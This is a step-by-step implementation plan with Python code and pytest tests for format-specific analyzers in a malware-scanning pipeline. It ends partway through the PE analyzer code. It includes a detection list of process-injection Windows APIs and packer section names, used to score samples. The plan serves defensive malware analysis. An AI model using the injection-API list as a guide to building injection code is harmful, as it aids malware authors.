# Format-Specific Analyzer Layer Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add format-specific analyzers (PE, Office adapter, PDF, LNK, Script) behind a unified AnalyzerRegistry, integrated into the pipeline as a new FormatAnalysisStage between parallel and sequential phases.

**Architecture:** A new `analyzers/` package mirrors the existing `extractors/` pattern — `FormatAnalyzer` ABC + `AnalyzerRegistry` dispatches by MIME/magic to the first matching analyzer. `FormatAnalysisStage` wraps the registry as a pipeline `Stage`. The existing `DocumentAnalysisStage` is wrapped (not rewritten) via `OfficeAnalyzerAdapter`.

**Tech Stack:** Python 3.11, asyncio, pefile, pypdf, LnkParse3, pytest + pytest-asyncio

**Spec:** `docs/superpowers/specs/2026-04-08-format-specific-analyzer-layer-design.md`

---

## File Structure

### New files (create)

| File | Responsibility |
|------|---------------|
| `worker/src/malscan_worker/analyzers/__init__.py` | Public exports |
| `worker/src/malscan_worker/analyzers/base.py` | `FormatAnalyzer` ABC + `AnalyzerResult` dataclass |
| `worker/src/malscan_worker/analyzers/registry.py` | `AnalyzerRegistry` + `get_default_analyzer_registry()` |
| `worker/src/malscan_worker/analyzers/pe_analyzer.py` | PE/EXE/DLL analysis using `pefile` |
| `worker/src/malscan_worker/analyzers/office_adapter.py` | Wraps `DocumentAnalysisStage` as `FormatAnalyzer` |
| `worker/src/malscan_worker/analyzers/pdf_analyzer.py` | PDF structural analysis using `pypdf` |
| `worker/src/malscan_worker/analyzers/lnk_analyzer.py` | LNK shortcut analysis using `LnkParse3` |
| `worker/src/malscan_worker/analyzers/script_analyzer.py` | PowerShell/JS/VBS/Batch/HTA analysis (stdlib only) |
| `worker/src/malscan_worker/stages/format_analysis.py` | `FormatAnalysisStage` — pipeline Stage dispatching to registry |
| `worker/tests/analyzers/__init__.py` | Test package |
| `worker/tests/analyzers/test_base.py` | Tests for AnalyzerResult + FormatAnalyzer contract |
| `worker/tests/analyzers/test_registry.py` | Tests for AnalyzerRegistry dispatch logic |
| `worker/tests/analyzers/test_pe_analyzer.py` | PE analyzer tests |
| `worker/tests/analyzers/test_office_adapter.py` | Office adapter tests |
| `worker/tests/analyzers/test_pdf_analyzer.py` | PDF analyzer tests |
| `worker/tests/analyzers/test_lnk_analyzer.py` | LNK analyzer tests |
| `worker/tests/analyzers/test_script_analyzer.py` | Script analyzer tests |
| `worker/tests/test_format_analysis_stage.py` | FormatAnalysisStage integration tests |

### Existing files (modify)

| File | Change |
|------|--------|
| `worker/pyproject.toml` | Add `pefile`, `pypdf`, `LnkParse3` deps |
| `worker/src/malscan_worker/pipeline.py` | Add FORMAT_ANALYSIS_STAGE phase, remove DocumentAnalysisStage from SEQUENTIAL_STAGES, add format-analysis scoring block, add `format_analysis` report section |

---

## Task 1: Add dependencies

**Files:**
- Modify: `worker/pyproject.toml:9-28`

- [ ] **Step 1: Add pefile, pypdf, and LnkParse3 to pyproject.toml**

In `worker/pyproject.toml`, add three new lines after the `oletools` line (line 28):

```toml
pefile = "^2023.2.7"
pypdf = "^4.0.0"
LnkParse3 = "^1.4.0"
```

The `[tool.poetry.dependencies]` section should end:

```toml
oletools = "^0.60"
pefile = "^2023.2.7"
pypdf = "^4.0.0"
LnkParse3 = "^1.4.0"
```

- [ ] **Step 2: Install dependencies**

Run: `cd worker && poetry lock --no-update && poetry install`

Expected: All three packages resolve and install without conflicts.

- [ ] **Step 3: Verify imports work**

Run: `cd worker && poetry run python -c "import pefile; import pypdf; import LnkParse3; print('OK')"`

Expected: `OK`

- [ ] **Step 4: Commit**

```bash
git add worker/pyproject.toml worker/poetry.lock
git commit -m "chore: add pefile, pypdf, LnkParse3 dependencies for format analyzers"
```

---

## Task 2: AnalyzerResult dataclass + FormatAnalyzer ABC

**Files:**
- Create: `worker/src/malscan_worker/analyzers/__init__.py`
- Create: `worker/src/malscan_worker/analyzers/base.py`
- Create: `worker/tests/analyzers/__init__.py`
- Create: `worker/tests/analyzers/test_base.py`

- [ ] **Step 1: Create the analyzers package**

Create `worker/src/malscan_worker/analyzers/__init__.py`:

```python
"""Format-specific analyzers for the malware analysis pipeline."""

from malscan_worker.analyzers.base import AnalyzerResult, FormatAnalyzer

__all__ = ["AnalyzerResult", "FormatAnalyzer"]
```

- [ ] **Step 2: Create the tests package**

Create `worker/tests/analyzers/__init__.py`:

```python
```

(Empty file — just a package marker.)

- [ ] **Step 3: Write failing tests for AnalyzerResult and FormatAnalyzer**

Create `worker/tests/analyzers/test_base.py`:

```python
"""Tests for FormatAnalyzer ABC and AnalyzerResult dataclass."""

import uuid
from pathlib import Path

import pytest
from malscan_worker.analyzers.base import AnalyzerResult, FormatAnalyzer
from malscan_worker.stages.base import StageContext


class TestAnalyzerResult:
    def test_default_fields(self):
        result = AnalyzerResult(
            analyzer_name="test",
            format_type="TEST/FILE",
        )
        assert result.analyzer_name == "test"
        assert result.format_type == "TEST/FILE"
        assert result.indicators == []
        assert result.features == {}
        assert result.extracted_strings == []
        assert result.risk_score == 0
        assert result.risk_factors == []
        assert result.errors == []
        assert result.extracted_artifacts == []

    def test_custom_fields(self):
        result = AnalyzerResult(
            analyzer_name="pe",
            format_type="PE/EXE",
            indicators=[{"type": "packer_detected", "severity": "medium", "detail": "UPX"}],
            features={"is_dll": False},
            extracted_strings=["CreateRemoteThread"],
            risk_score=45,
            risk_factors=["Packer detected"],
            errors=[],
            extracted_artifacts=[{"filename": "payload.bin", "sha256": "abc", "size": 100, "path": "/tmp/x", "source": "overlay"}],
        )
        assert result.risk_score == 45
        assert len(result.indicators) == 1
        assert result.indicators[0]["severity"] == "medium"
        assert result.extracted_artifacts[0]["filename"] == "payload.bin"


class TestFormatAnalyzerABC:
    def test_cannot_instantiate_abc(self):
        """FormatAnalyzer is abstract — instantiation should fail."""
        with pytest.raises(TypeError):
            FormatAnalyzer()  # type: ignore[abstract]

    def test_concrete_subclass(self, tmp_path):
        """A concrete subclass with all methods implemented works."""

        class DummyAnalyzer(FormatAnalyzer):
            @property
            def name(self) -> str:
                return "dummy"

            def can_handle(self, file_path: Path, mime: str, magic: bytes) -> bool:
                return mime == "application/x-dummy"

            async def analyze(self, file_path: Path, ctx: StageContext) -> AnalyzerResult:
                return AnalyzerResult(analyzer_name="dummy", format_type="DUMMY")

        analyzer = DummyAnalyzer()
        assert analyzer.name == "dummy"
        assert analyzer.can_handle(tmp_path / "f", "application/x-dummy", b"") is True
        assert analyzer.can_handle(tmp_path / "f", "text/plain", b"") is False
```

- [ ] **Step 4: Run tests — verify they fail**

Run: `cd worker && poetry run pytest tests/analyzers/test_base.py -v`

Expected: ImportError — `malscan_worker.analyzers.base` does not exist yet.

- [ ] **Step 5: Implement AnalyzerResult and FormatAnalyzer**

Create `worker/src/malscan_worker/analyzers/base.py`:

```python
"""Base classes for format-specific analyzers."""

from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from malscan_worker.stages.base import StageContext


@dataclass
class AnalyzerResult:
    """Standardized result from a format-specific analyzer."""

    analyzer_name: str  # "pe", "pdf", "lnk", "script", "office"
    format_type: str  # "PE/EXE", "PE/DLL", "PDF", "LNK", "PowerShell", etc.

    # Structured findings
    indicators: list[dict[str, Any]] = field(default_factory=list)
    # Each indicator: {"type": str, "severity": str, "detail": str, "evidence": Any}
    features: dict[str, Any] = field(default_factory=dict)
    extracted_strings: list[str] = field(default_factory=list)

    # Risk assessment
    risk_score: int = 0  # 0-100
    risk_factors: list[str] = field(default_factory=list)

    # Errors
    errors: list[str] = field(default_factory=list)

    # Extracted artifacts for sub-job submission
    extracted_artifacts: list[dict[str, Any]] = field(default_factory=list)
    # Each artifact: {"filename": str, "sha256": str, "size": int, "path": str, "source": str}


class FormatAnalyzer(ABC):
    """Base class for format-specific analyzers."""

    @property
    @abstractmethod
    def name(self) -> str:
        """Short identifier: 'pe', 'pdf', 'lnk', 'script', 'office'."""
        ...

    @abstractmethod
    def can_handle(self, file_path: Path, mime: str, magic: bytes) -> bool:
        """Return True if this analyzer should process the file.

        Called with file_path, MIME from file-type stage, and first 32 bytes.
        """
        ...

    @abstractmethod
    async def analyze(self, file_path: Path, ctx: StageContext) -> AnalyzerResult:
        """Run format-specific analysis.

        Must not write to DB. May use run_in_executor for CPU-bound work.
        Has access to ctx.previous_results, ctx.sha256, ctx.original_filename.
        """
        ...
```

- [ ] **Step 6: Run tests — verify they pass**

Run: `cd worker && poetry run pytest tests/analyzers/test_base.py -v`

Expected: All 4 tests PASS.

- [ ] **Step 7: Commit**

```bash
git add worker/src/malscan_worker/analyzers/ worker/tests/analyzers/
git commit -m "feat: add FormatAnalyzer ABC and AnalyzerResult dataclass"
```

---

## Task 3: AnalyzerRegistry

**Files:**
- Create: `worker/src/malscan_worker/analyzers/registry.py`
- Create: `worker/tests/analyzers/test_registry.py`
- Modify: `worker/src/malscan_worker/analyzers/__init__.py`

- [ ] **Step 1: Write failing tests for AnalyzerRegistry**

Create `worker/tests/analyzers/test_registry.py`:

```python
"""Tests for AnalyzerRegistry dispatch logic."""

from pathlib import Path

import pytest
from malscan_worker.analyzers.base import AnalyzerResult, FormatAnalyzer
from malscan_worker.analyzers.registry import AnalyzerRegistry
from malscan_worker.stages.base import StageContext


class StubAnalyzer(FormatAnalyzer):
    """Stub analyzer for registry tests."""

    def __init__(self, analyzer_name: str, handles_mime: str = "", handles_magic: bytes = b""):
        self._name = analyzer_name
        self._handles_mime = handles_mime
        self._handles_magic = handles_magic

    @property
    def name(self) -> str:
        return self._name

    def can_handle(self, file_path: Path, mime: str, magic: bytes) -> bool:
        if self._handles_magic and magic.startswith(self._handles_magic):
            return True
        if self._handles_mime and self._handles_mime in mime:
            return True
        return False

    async def analyze(self, file_path: Path, ctx: StageContext) -> AnalyzerResult:
        return AnalyzerResult(analyzer_name=self._name, format_type="STUB")


class TestAnalyzerRegistry:
    def test_detect_returns_none_for_empty_registry(self, tmp_path):
        registry = AnalyzerRegistry()
        f = tmp_path / "test.bin"
        f.write_bytes(b"\x00" * 32)
        assert registry.detect(f, "application/octet-stream") is None

    def test_detect_returns_first_match_by_mime(self, tmp_path):
        registry = AnalyzerRegistry()
        a1 = StubAnalyzer("pe", handles_mime="x-dosexec")
        a2 = StubAnalyzer("pdf", handles_mime="pdf")
        registry.register(a1)
        registry.register(a2)

        f = tmp_path / "test.exe"
        f.write_bytes(b"\x00" * 32)
        result = registry.detect(f, "application/x-dosexec")
        assert result is not None
        assert result.name == "pe"

    def test_detect_returns_first_match_by_magic(self, tmp_path):
        registry = AnalyzerRegistry()
        a1 = StubAnalyzer("pe", handles_magic=b"MZ")
        a2 = StubAnalyzer("pdf", handles_magic=b"%PDF-")
        registry.register(a1)
        registry.register(a2)

        f = tmp_path / "test.bin"
        f.write_bytes(b"%PDF-1.4 rest of content" + b"\x00" * 32)
        result = registry.detect(f, "")
        assert result is not None
        assert result.name == "pdf"

    def test_detect_first_match_wins(self, tmp_path):
        """If multiple analyzers match, the first registered one wins."""
        registry = AnalyzerRegistry()
        a1 = StubAnalyzer("first", handles_mime="octet-stream")
        a2 = StubAnalyzer("second", handles_mime="octet-stream")
        registry.register(a1)
        registry.register(a2)

        f = tmp_path / "test.bin"
        f.write_bytes(b"\x00" * 32)
        result = registry.detect(f, "application/octet-stream")
        assert result is not None
        assert result.name == "first"

    def test_detect_handles_missing_file(self, tmp_path):
        """If the file doesn't exist, magic is empty but analyzers can still match on MIME."""
        registry = AnalyzerRegistry()
        a1 = StubAnalyzer("pe", handles_mime="x-dosexec")
        registry.register(a1)

        missing = tmp_path / "nonexistent.exe"
        result = registry.detect(missing, "application/x-dosexec")
        assert result is not None
        assert result.name == "pe"

    def test_detect_no_match(self, tmp_path):
        registry = AnalyzerRegistry()
        a1 = StubAnalyzer("pe", handles_mime="x-dosexec")
        registry.register(a1)

        f = tmp_path / "test.txt"
        f.write_bytes(b"hello world")
        assert registry.detect(f, "text/plain") is None

    def test_detect_reads_32_bytes_magic(self, tmp_path):
        """Registry should read first 32 bytes for magic detection."""
        magic_32 = b"A" * 32
        registry = AnalyzerRegistry()

        class Magic32Analyzer(FormatAnalyzer):
            @property
            def name(self) -> str:
                return "magic32"

            def can_handle(self, file_path: Path, mime: str, magic: bytes) -> bool:
                return len(magic) == 32 and magic == magic_32

            async def analyze(self, file_path: Path, ctx: StageContext) -> AnalyzerResult:
                return AnalyzerResult(analyzer_name="magic32", format_type="TEST")

        registry.register(Magic32Analyzer())
        f = tmp_path / "test.bin"
        f.write_bytes(magic_32 + b"extra data")
        result = registry.detect(f, "")
        assert result is not None
        assert result.name == "magic32"
```

- [ ] **Step 2: Run tests — verify they fail**

Run: `cd worker && poetry run pytest tests/analyzers/test_registry.py -v`

Expected: ImportError — `malscan_worker.analyzers.registry` does not exist yet.

- [ ] **Step 3: Implement AnalyzerRegistry**

Create `worker/src/malscan_worker/analyzers/registry.py`:

```python
"""Format analyzer registry."""

from pathlib import Path

from malscan_worker.analyzers.base import FormatAnalyzer


class AnalyzerRegistry:
    """Registry of format analyzers, checked in registration order."""

    def __init__(self) -> None:
        self._analyzers: list[FormatAnalyzer] = []

    def register(self, analyzer: FormatAnalyzer) -> None:
        self._analyzers.append(analyzer)

    def detect(self, file_path: Path, mime: str) -> FormatAnalyzer | None:
        """Return the first analyzer that can handle the file, or None."""
        magic = b""
        try:
            with open(file_path, "rb") as f:
                magic = f.read(32)
        except OSError:
            pass
        for analyzer in self._analyzers:
            if analyzer.can_handle(file_path, mime, magic):
                return analyzer
        return None


def get_default_analyzer_registry() -> AnalyzerRegistry:
    """Create a registry with all built-in analyzers in priority order.

    Registration order: PE -> Office -> PDF -> LNK -> Script (first match wins).
    """
    from malscan_worker.analyzers.lnk_analyzer import LNKAnalyzer
    from malscan_worker.analyzers.office_adapter import OfficeAnalyzerAdapter
    from malscan_worker.analyzers.pdf_analyzer import PDFAnalyzer
    from malscan_worker.analyzers.pe_analyzer import PEAnalyzer
    from malscan_worker.analyzers.script_analyzer import ScriptAnalyzer

    registry = AnalyzerRegistry()
    registry.register(PEAnalyzer())
    registry.register(OfficeAnalyzerAdapter())
    registry.register(PDFAnalyzer())
    registry.register(LNKAnalyzer())
    registry.register(ScriptAnalyzer())
    return registry
```

- [ ] **Step 4: Update `__init__.py` exports**

Update `worker/src/malscan_worker/analyzers/__init__.py`:

```python
"""Format-specific analyzers for the malware analysis pipeline."""

from malscan_worker.analyzers.base import AnalyzerResult, FormatAnalyzer
from malscan_worker.analyzers.registry import AnalyzerRegistry

__all__ = ["AnalyzerResult", "AnalyzerRegistry", "FormatAnalyzer"]
```

- [ ] **Step 5: Run tests — verify they pass**

Run: `cd worker && poetry run pytest tests/analyzers/test_registry.py -v`

Expected: All 7 tests PASS.

- [ ] **Step 6: Commit**

```bash
git add worker/src/malscan_worker/analyzers/registry.py worker/src/malscan_worker/analyzers/__init__.py worker/tests/analyzers/test_registry.py
git commit -m "feat: add AnalyzerRegistry with first-match dispatch"
```

---

## Task 4: PE Analyzer

**Files:**
- Create: `worker/src/malscan_worker/analyzers/pe_analyzer.py`
- Create: `worker/tests/analyzers/test_pe_analyzer.py`

This is the largest single analyzer. It uses `pefile` to parse PE headers, sections, imports, exports, resources, and detect suspicious indicators.

- [ ] **Step 1: Write failing tests for PEAnalyzer**

Create `worker/tests/analyzers/test_pe_analyzer.py`:

```python
"""Tests for PEAnalyzer."""

import struct
import uuid
from datetime import datetime, timezone
from pathlib import Path

import pytest
from malscan_worker.analyzers.pe_analyzer import PEAnalyzer
from malscan_worker.stages.base import StageContext, StageResult

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_ctx(file_path: Path, mime: str = "", original_filename: str = "test.exe") -> StageContext:
    ctx = StageContext(
        job_id=str(uuid.uuid4()),
        file_id=str(uuid.uuid4()),
        storage_key="deadbeef" * 8,
        sha256="deadbeef" * 8,
        original_filename=original_filename,
        file_path=file_path,
    )
    ctx.previous_results = [
        StageResult(
            stage_name="file-type",
            status="ok",
            started_at=datetime.now(timezone.utc),
            ended_at=datetime.now(timezone.utc),
            duration_ms=1,
            findings={"mime_type": mime},
            artifacts=[],
        )
    ]
    return ctx


def _minimal_pe_bytes() -> bytes:
    """Build a minimal valid PE that pefile can parse.

    Creates a tiny PE with:
    - DOS header (64 bytes) with MZ magic and e_lfanew pointing to PE header
    - PE signature (4 bytes)
    - IMAGE_FILE_HEADER (20 bytes)
    - IMAGE_OPTIONAL_HEADER (minimal, 96 bytes for PE32)
    - One section (.text)
    """
    dos_header = bytearray(64)
    dos_header[0:2] = b"MZ"
    e_lfanew = 64
    struct.pack_into("<I", dos_header, 60, e_lfanew)

    pe_sig = b"PE\x00\x00"

    # IMAGE_FILE_HEADER: Machine=0x14c (i386), 1 section, timestamp=0x60000000
    file_header = struct.pack(
        "<HHIIIHH",
        0x14C,  # Machine (i386)
        1,  # NumberOfSections
        0x60000000,  # TimeDateStamp (2021-01-14)
        0,  # PointerToSymbolTable
        0,  # NumberOfSymbols
        0xE0,  # SizeOfOptionalHeader (PE32)
        0x0002,  # Characteristics (EXECUTABLE_IMAGE)
    )

    # Minimal IMAGE_OPTIONAL_HEADER_PE32 (224 = 0xE0 bytes)
    opt_header = bytearray(0xE0)
    struct.pack_into("<H", opt_header, 0, 0x10B)  # Magic = PE32
    opt_header[16:20] = struct.pack("<I", 0x1000)  # AddressOfEntryPoint
    opt_header[28:32] = struct.pack("<I", 0x400000)  # ImageBase
    opt_header[32:36] = struct.pack("<I", 0x1000)  # SectionAlignment
    opt_header[36:40] = struct.pack("<I", 0x200)  # FileAlignment
    opt_header[64:68] = struct.pack("<I", 0x3000)  # SizeOfImage
    opt_header[60:64] = struct.pack("<I", 0x200)  # SizeOfHeaders
    struct.pack_into("<I", opt_header, 116, 16)  # NumberOfRvaAndSizes

    # Section header: .text section (40 bytes)
    section = bytearray(40)
    section[0:6] = b".text\x00"
    struct.pack_into("<I", section, 8, 0x100)  # VirtualSize
    struct.pack_into("<I", section, 12, 0x1000)  # VirtualAddress
    struct.pack_into("<I", section, 16, 0x200)  # SizeOfRawData
    struct.pack_into("<I", section, 20, 0x200)  # PointerToRawData
    struct.pack_into("<I", section, 36, 0x60000020)  # CODE | EXECUTE | READ

    # Pad to SizeOfHeaders (0x200) then add section data
    header_data = bytes(dos_header) + pe_sig + file_header + bytes(opt_header) + bytes(section)
    padding = b"\x00" * (0x200 - len(header_data))
    section_data = b"\xCC" * 0x200  # INT3 filler

    return header_data + padding + section_data


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------


class TestPEAnalyzerCanHandle:
    def setup_method(self):
        self.analyzer = PEAnalyzer()

    def test_handles_mz_magic(self, tmp_path):
        f = tmp_path / "test.exe"
        f.write_bytes(_minimal_pe_bytes())
        assert self.analyzer.can_handle(f, "", f.read_bytes()[:32]) is True

    def test_handles_dosexec_mime(self, tmp_path):
        f = tmp_path / "test.bin"
        f.write_bytes(b"\x00" * 32)
        assert self.analyzer.can_handle(f, "application/x-dosexec", b"\x00" * 32) is True

    def test_handles_msdownload_mime(self, tmp_path):
        f = tmp_path / "test.bin"
        f.write_bytes(b"\x00" * 32)
        assert self.analyzer.can_handle(f, "application/x-msdownload", b"\x00" * 32) is True

    def test_rejects_non_pe(self, tmp_path):
        f = tmp_path / "test.txt"
        f.write_bytes(b"hello world" + b"\x00" * 21)
        assert self.analyzer.can_handle(f, "text/plain", b"hello world" + b"\x00" * 21) is False

    def test_mz_without_pe_header_rejected(self, tmp_path):
        """MZ magic alone is not enough — need valid e_lfanew pointing to PE sig."""
        f = tmp_path / "test.bin"
        data = b"MZ" + b"\x00" * 58 + b"\x40\x00\x00\x00" + b"\x00" * 32  # e_lfanew=64, no PE sig
        f.write_bytes(data)
        assert self.analyzer.can_handle(f, "", data[:32]) is False


@pytest.mark.asyncio
class TestPEAnalyzerAnalyze:
    def setup_method(self):
        self.analyzer = PEAnalyzer()

    async def test_analyze_minimal_pe(self, tmp_path):
        f = tmp_path / "test.exe"
        f.write_bytes(_minimal_pe_bytes())
        ctx = _make_ctx(f, "application/x-dosexec")

        result = await self.analyzer.analyze(f, ctx)

        assert result.analyzer_name == "pe"
        assert result.format_type in ("PE/EXE", "PE/DLL")
        assert "sections" in result.features
        assert "headers" in result.features
        assert isinstance(result.risk_score, int)
        assert 0 <= result.risk_score <= 100
        assert result.errors == []

    async def test_analyze_corrupt_pe(self, tmp_path):
        """Corrupt PE should return partial results with error, not crash."""
        f = tmp_path / "corrupt.exe"
        f.write_bytes(b"MZ" + b"\x00" * 100)
        ctx = _make_ctx(f, "application/x-dosexec")

        result = await self.analyzer.analyze(f, ctx)

        assert result.analyzer_name == "pe"
        assert len(result.errors) > 0

    async def test_analyze_oversized_file_skipped(self, tmp_path):
        """Files > 100MB should be skipped."""
        f = tmp_path / "big.exe"
        f.write_bytes(_minimal_pe_bytes())
        ctx = _make_ctx(f, "application/x-dosexec")

        # Monkey-patch file size check
        original_stat = f.stat
        from unittest.mock import patch, PropertyMock
        import os

        with patch.object(Path, "stat") as mock_stat:
            mock_result = original_stat()
            mock_stat.return_value = os.stat_result(
                (mock_result.st_mode, mock_result.st_ino, mock_result.st_dev,
                 mock_result.st_nlink, mock_result.st_uid, mock_result.st_gid,
                 101 * 1024 * 1024,  # st_size = 101MB
                 mock_result.st_atime, mock_result.st_mtime, mock_result.st_ctime)
            )
            result = await self.analyzer.analyze(f, ctx)

        assert result.risk_score == 0
        assert any("too large" in e.lower() or "skip" in e.lower() for e in result.errors)

    async def test_timestamp_anomaly_indicator(self, tmp_path):
        """PE with future timestamp should produce timestamp_anomaly indicator."""
        pe_bytes = bytearray(_minimal_pe_bytes())
        # TimeDateStamp is at offset 64 (PE sig) + 4 (sig) + 4 (machine+sections) = byte 72
        # Actually: DOS(64) + PE_SIG(4) + FILE_HEADER offset 4 = timestamp at offset 72
        struct.pack_into("<I", pe_bytes, 72, 0xFFFFFFFF)  # far future
        f = tmp_path / "future.exe"
        f.write_bytes(bytes(pe_bytes))
        ctx = _make_ctx(f, "application/x-dosexec")

        result = await self.analyzer.analyze(f, ctx)

        types = [i["type"] for i in result.indicators]
        assert "timestamp_anomaly" in types

    async def test_high_entropy_section_indicator(self, tmp_path):
        """Section filled with random-like data should trigger high_entropy_section."""
        import os
        pe_bytes = bytearray(_minimal_pe_bytes())
        # Replace .text section data (at offset 0x200, size 0x200) with high-entropy data
        random_data = os.urandom(0x200)
        pe_bytes[0x200:0x400] = random_data
        f = tmp_path / "packed.exe"
        f.write_bytes(bytes(pe_bytes))
        ctx = _make_ctx(f, "application/x-dosexec")

        result = await self.analyzer.analyze(f, ctx)

        # High entropy data should produce indicator (entropy > 7.5)
        types = [i["type"] for i in result.indicators]
        has_entropy = "high_entropy_section" in types or "packer_detected" in types
        assert has_entropy or result.features.get("sections", [{}])[0].get("entropy", 0) > 6.0
```

- [ ] **Step 2: Run tests — verify they fail**

Run: `cd worker && poetry run pytest tests/analyzers/test_pe_analyzer.py -v`

Expected: ImportError — `malscan_worker.analyzers.pe_analyzer` does not exist yet.

- [ ] **Step 3: Implement PEAnalyzer**

Create `worker/src/malscan_worker/analyzers/pe_analyzer.py`:

```python
"""PE (Portable Executable) format analyzer."""

from __future__ import annotations

import asyncio
import math
import struct
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

import structlog

from malscan_worker.analyzers.base import AnalyzerResult, FormatAnalyzer
from malscan_worker.stages.base import StageContext

log = structlog.get_logger()

# ---------------------------------------------------------------------------
# Optional dependency
# ---------------------------------------------------------------------------
try:
    import pefile

    HAS_PEFILE = True
except ImportError:
    HAS_PEFILE = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
MAX_PE_SIZE = 100 * 1024 * 1024  # 100 MB

# Known suspicious import functions (process injection / shellcode)
SUSPICIOUS_IMPORTS: set[str] = {
    "VirtualAlloc",
    "VirtualAllocEx",
    "CreateRemoteThread",
    "WriteProcessMemory",
    "NtQueueApcThread",
    "SetWindowsHookEx",
    "QueueUserAPC",
    "NtUnmapViewOfSection",
    "RtlMoveMemory",
}

# Standard section names (non-suspicious)
STANDARD_SECTIONS: set[str] = {
    ".text", ".rdata", ".data", ".rsrc", ".reloc",
    ".pdata", ".edata", ".idata", ".tls", ".bss",
    ".CRT", ".debug", ".crt",
}

# Known packer section names
PACKER_SECTIONS: set[str] = {
    "UPX0", "UPX1", "UPX2", ".aspack", ".adata",
    ".themida", ".nsp0", ".nsp1", ".petite",
    ".packed", ".RLPack", ".perplex",
}


def _entropy(data: bytes) -> float:
    """Calculate Shannon entropy of a byte sequence."""
    if not data:
        return 0.0
    freq = [0] * 256
    for b in data:
        freq[b] += 1
    length = len(data)
    ent = 0.0
    for count in freq:
        if count:
            p = count / length
            ent -= p * math.log2(p)
    return ent


def _is_valid_pe(file_path: Path) -> bool:
    """Quick check: MZ magic + valid PE signature at e_lfanew."""
    try:
        with open(file_path, "rb") as f:
            head = f.read(512)
        if len(head) < 64 or head[:2] != b"MZ":
            return False
        e_lfanew = struct.unpack_from("<I", head, 60)[0]
        if e_lfanew + 4 > len(head):
            # Try reading more
            with open(file_path, "rb") as f:
                f.seek(e_lfanew)
                sig = f.read(4)
            return sig == b"PE\x00\x00"
        return head[e_lfanew : e_lfanew + 4] == b"PE\x00\x00"
    except (OSError, struct.error):
        return False


# Severity → score weights
_SEVERITY_SCORES = {"critical": 25, "high": 15, "medium": 8, "low": 3}


def _compute_risk_score(indicators: list[dict[str, Any]]) -> int:
    """Compute risk score from indicators using severity weights."""
    score = 0
    for ind in indicators:
        score += _SEVERITY_SCORES.get(ind.get("severity", ""), 0)
    return min(score, 100)


class PEAnalyzer(FormatAnalyzer):
    """Analyze PE (EXE/DLL) files for suspicious characteristics."""

    PE_MIMES = {
        "application/x-dosexec",
        "application/x-msdownload",
        "application/vnd.microsoft.portable-executable",
    }

    @property
    def name(self) -> str:
        return "pe"

    def can_handle(self, file_path: Path, mime: str, magic: bytes) -> bool:
        # MIME match
        if mime in self.PE_MIMES:
            return True
        # Magic bytes: MZ + valid PE header
        if magic[:2] == b"MZ":
            return _is_valid_pe(file_path)
        return False

    async def analyze(self, file_path: Path, ctx: StageContext) -> AnalyzerResult:
        if not HAS_PEFILE:
            return AnalyzerResult(
                analyzer_name=self.name,
                format_type="PE",
                errors=["pefile library not installed"],
            )

        # Size guard
        try:
            file_size = file_path.stat().st_size
        except OSError:
            return AnalyzerResult(
                analyzer_name=self.name,
                format_type="PE",
                errors=["Cannot stat file"],
            )
        if file_size > MAX_PE_SIZE:
            return AnalyzerResult(
                analyzer_name=self.name,
                format_type="PE",
                errors=[f"File too large for PE analysis — skipped ({file_size} bytes)"],
            )

        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, self._analyze_sync, file_path)

    def _analyze_sync(self, file_path: Path) -> AnalyzerResult:
        """Synchronous PE analysis (runs in executor)."""
        indicators: list[dict[str, Any]] = []
        features: dict[str, Any] = {}
        extracted_strings: list[str] = []
        errors: list[str] = []

        try:
            pe = pefile.PE(str(file_path))
        except pefile.PEFormatError as e:
            return AnalyzerResult(
                analyzer_name=self.name,
                format_type="PE",
                errors=[f"PEFormatError: {e}"],
            )
        except Exception as e:
            return AnalyzerResult(
                analyzer_name=self.name,
                format_type="PE",
                errors=[f"PE parse error: {e}"],
            )

        try:
            is_dll = bool(pe.FILE_HEADER.Characteristics & 0x2000)
            is_64bit = pe.FILE_HEADER.Machine in (0x8664, 0xAA64)
            format_type = "PE/DLL" if is_dll else "PE/EXE"

            # --- Headers ---
            timestamp = pe.FILE_HEADER.TimeDateStamp
            try:
                ts_dt = datetime.fromtimestamp(timestamp, tz=timezone.utc)
            except (OSError, ValueError, OverflowError):
                ts_dt = None

            features["headers"] = {
                "machine": hex(pe.FILE_HEADER.Machine),
                "timestamp": timestamp,
                "timestamp_utc": ts_dt.isoformat() if ts_dt else None,
                "subsystem": getattr(pe.OPTIONAL_HEADER, "Subsystem", None),
                "dll_characteristics": getattr(pe.OPTIONAL_HEADER, "DllCharacteristics", None),
                "entry_point": getattr(pe.OPTIONAL_HEADER, "AddressOfEntryPoint", None),
            }
            features["is_dll"] = is_dll
            features["is_64bit"] = is_64bit

            # Timestamp anomaly
            now = datetime.now(tz=timezone.utc)
            min_ts = datetime(2000, 1, 1, tzinfo=timezone.utc)
            if ts_dt is not None and (ts_dt > now or ts_dt < min_ts):
                indicators.append({
                    "type": "timestamp_anomaly",
                    "severity": "low",
                    "detail": f"Compile timestamp {ts_dt.isoformat() if ts_dt else timestamp} is anomalous",
                    "evidence": {"timestamp": timestamp},
                })
            elif ts_dt is None:
                indicators.append({
                    "type": "timestamp_anomaly",
                    "severity": "low",
                    "detail": f"Compile timestamp {timestamp} could not be parsed",
                    "evidence": {"timestamp": timestamp},
                })

            # --- Sections ---
            sections_info = []
            packer_clues: list[str] = []
            high_entropy_exec_count = 0
            for section in pe.sections:
                sec_name = section.Name.rstrip(b"\x00").decode("ascii", errors="replace").strip()
                sec_entropy = section.get_entropy()
                sec_info = {
                    "name": sec_name,
                    "virtual_size": section.Misc_VirtualSize,
                    "raw_size": section.SizeOfRawData,
                    "entropy": round(sec_entropy, 2),
                    "characteristics": hex(section.Characteristics),
                }
                sections_info.append(sec_info)

                # Packer detection by section name
                if sec_name in PACKER_SECTIONS:
                    packer_clues.append(sec_name)

                # Suspicious section name
                if sec_name and sec_name not in STANDARD_SECTIONS and sec_name not in PACKER_SECTIONS:
                    indicators.append({
                        "type": "suspicious_section_name",
                        "severity": "medium",
                        "detail": f"Non-standard section name: {sec_name}",
